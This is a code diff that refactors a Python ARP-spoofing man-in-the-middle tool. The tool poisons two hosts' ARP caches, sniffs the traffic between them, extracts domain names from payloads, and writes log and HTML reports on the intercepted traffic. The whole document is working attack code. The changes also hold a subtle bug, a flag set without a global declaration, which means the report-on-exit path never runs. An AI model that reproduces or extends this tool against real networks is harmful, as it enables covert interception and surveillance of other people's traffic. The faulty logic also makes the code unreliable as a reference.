@@ -12,12 +12,13 @@ import sys
 import signal
 
 # Global flag to handle graceful termination
-stop_event = threading.Event()
+running = True
+reportSig = False
 
 def arpSpoof(target, spoofIp, iface):
     pkt = ARP(op=2, pdst=target, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoofIp)
     print(f"Sending ARP spoof packets to target {target}, impersonating {spoofIp}.")
-    while not stop_event.is_set():
+    while running:
         send(pkt, iface=iface, verbose=False)
         time.sleep(1)
 
@@ -35,6 +36,7 @@ def startAttack(target1, target2, iface, report):
     threading.Thread(target=arpSpoof, args=(target2, target1, iface), daemon=True).start()
     # Start sniffing and forwarding packets
     if report == 1:
+        reportSig = True
         createReport(target1, target2, iface)
     else:
         sniffAndForward(target1, target2, iface)
@@ -51,11 +53,11 @@ def createReport(target1, target2, iface):
     # Data aggregation structures
     protocolCount = {}
     domainSet = set()
-    csvFilename = "sniffingData.txt"
+    txtFilename = "sniffingData.txt"
     
-    # Create CSV file and write header
-    with open(csvFilename, "w") as csv_file:
-        csv_file.write("Protocols,Packet Summary\n")
+    # Create or clear the txt file and write initial data
+    with open(txtFilename, "w") as txt_file:
+        txt_file.write("Target1,Target2,Interface,Protocols,Packet Summary,Domains\n")  # CSV header
 
     def extractDomains(payload):
         # Simple regex for domain extraction
@@ -77,7 +79,7 @@ def createReport(target1, target2, iface):
                 protocols.append(applicationPorts[sport])
             if dport in applicationPorts:
                 protocols.append(applicationPorts[dport])
- 
+
         # Analyze raw payload for protocol patterns and domain names
         if packet.haslayer("Raw"):
             payload = packet["Raw"].load.decode(errors="ignore").lower()
@@ -131,13 +133,10 @@ def createReport(target1, target2, iface):
             msg = f"Application Layer Protocols: {protocols} | Packet Summary: {summary}"
             print(msg)
 
-            # Append the protocols and summary to the CSV file
-            with open(csvFilename, "a") as csv_file:
-                csv_file.write(f"{'|'.join(protocols)},{summary}\n")
-
-            # Update protocol counts for the report
-            for proto in protocols:
-                protocolCount[proto] = protocolCount.get(proto, 0) + 1
+            # Append the protocols and summary to the txt file
+            with open(txtFilename, "a") as txt_file:
+                domains = ", ".join(domainSet) if domainSet else "No domains detected"
+                txt_file.write(f"{target1},{target2},{iface},{', '.join(protocols)},{summary},{domains}\n")
 
     try:
         print(f"\nSniffing packets between {target1} and {target2} on interface {iface}... Press Ctrl+C to stop and create a report.")
@@ -145,10 +144,37 @@ def createReport(target1, target2, iface):
         sniff(iface=iface, filter="ip", prn=packetCallback, store=False, timeout=None)
     except KeyboardInterrupt:
         print("\nStopping packet sniffing.")
-        generateHtmlReport(target1, target2, iface, protocolCount, domainSet, csvFilename)
 
-def generateHtmlReport(target1, target2, iface, protocolCount, domainSet, csvFilename):
-    # Build the HTML report with inline CSS styling
+def generateHtmlReport(txtFilename):
+    # Initialize report variables
+    target1 = target2 = iface = ""
+    protocolCount = {}
+    domainSet = set()
+
+    # Read the content of the txt file to extract information
+    with open(txtFilename, "r") as txt_file:
+        lines = txt_file.readlines()
+
+        # Extract basic information
+        for line in lines[1:]:  # Skip the header
+            columns = line.strip().split(',')
+            if len(columns) < 6:
+                continue  # In case the line is malformed
+            
+            # Extract data
+            target1 = columns[0]
+            target2 = columns[1]
+            iface = columns[2]
+            protocols = columns[3].split(", ")
+            summary = columns[4]
+            domains = columns[5]
+            
+            # Update protocol counts
+            for proto in protocols:
+                protocolCount[proto] = protocolCount.get(proto, 0) + 1
+            domainSet.update(domains.split(", "))  # Add found domains
+
+    # Build the HTML report
     htmlContent = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -195,11 +221,13 @@ def generateHtmlReport(target1, target2, iface, protocolCount, domainSet, csvFil
   </div>
 </body>
 </html>
-""".format(csvFilename=csvFilename)
+""".format(csvFilename=txtFilename)
 
+    # Write the HTML content to a file
     with open("report.html", "w") as html_file:
         html_file.write(htmlContent)
     print("HTML report generated: report.html")
+
 
 def menu():
     RED = "\033[38;2;255;0;0m"
@@ -235,8 +263,11 @@ def terminal():
         parser.error("Syntax error.")
 
 def signalHandler(sig, frame):
+    global running
     print("\nGracefully stopping attack...")
-    stop_event.set()  # Set the stop event to terminate threads gracefully
+    running = False
+    if reportSig == True:
+        generateHtmlReport("sniffingData.txt")
     sys.exit(0)
 
 def main():
